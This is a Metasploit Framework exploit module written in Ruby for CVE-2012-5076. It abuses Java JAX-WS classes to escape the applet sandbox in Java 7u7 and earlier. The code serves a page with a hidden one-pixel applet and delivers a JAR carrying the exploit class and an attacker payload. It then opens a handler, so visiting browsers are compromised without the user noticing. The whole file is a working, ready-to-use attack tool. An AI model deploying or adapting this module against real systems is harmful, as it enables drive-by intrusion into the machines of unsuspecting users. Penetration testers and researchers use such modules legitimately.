##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpServer::HTML

include Msf::Exploit::Remote::BrowserAutopwn
autopwn_info({ :javascript => false })

def initialize( info = {} )
super( update_info( info,
'Name' => 'Java Applet JAX-WS Remote Code Execution',
'Description' => %q{
This module abuses the JAX-WS classes from a Java Applet to run arbitrary Java
code outside of the sandbox as exploited in the wild in November of 2012. The
vulnerability affects Java version 7u7 and earlier.
},
'License' => MSF_LICENSE,
'Author' =>
[
'Unknown', # Vulnerability Discovery
'juan vazquez' # metasploit module
],
'References' =>
[
[ 'CVE', '2012-5076' ],
[ 'OSVDB', '86363' ],
[ 'BID', '56054' ],
[ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html' ],
[ 'URL', 'http://malware.dontneedcoffee.com/2012/11/cool-ek-hello-my-friend-cve-2012-5067.html' ]
],
'Platform' => [ 'java', 'win' ],
'Payload' => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
'Targets' =>
[
[ 'Generic (Java Payload)',
{
'Arch' => ARCH_JAVA,
}
],
[ 'Windows Universal',
{
'Arch' => ARCH_X86,
'Platform' => 'win'
}
],
[ 'Linux x86',
{
'Arch' => ARCH_X86,
'Platform' => 'linux'
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => 'Oct 16 2012'
))
end


def on_request_uri( cli, request )
if not request.uri.match(/\.jar$/i)
if not request.uri.match(/\/$/)
send_redirect(cli, get_resource() + '/', '')
return
end

print_status("#{self.name} handling request")

send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )
return
end

paths = [
[ "Exploit.class" ],
[ "MyPayload.class" ]
]

p = regenerate_payload(cli)

jar = p.encoded_jar

paths.each do |path|
1.upto(path.length - 1) do |idx|
full = path[0,idx].join("/") + "/"
if !(jar.entries.map{|e|e.name}.include?(full))
jar.add_file(full, '')
end
end
fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2012-5076", path ), "rb")
data = fd.read(fd.stat.size)
jar.add_file(path.join("/"), data)
fd.close
end

print_status("Sending Applet.jar")
send_response( cli, jar.pack, { 'Content-Type' => "application/octet-stream" } )

handler( cli )
end

def generate_html
jar_name = rand_text_alpha(rand(6)+3) + ".jar"
html = "<html><head></head>"
html += "<body>"
html += "<applet archive=\"#{jar_name}\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
html += "</applet></body></html>"
return html
end

end
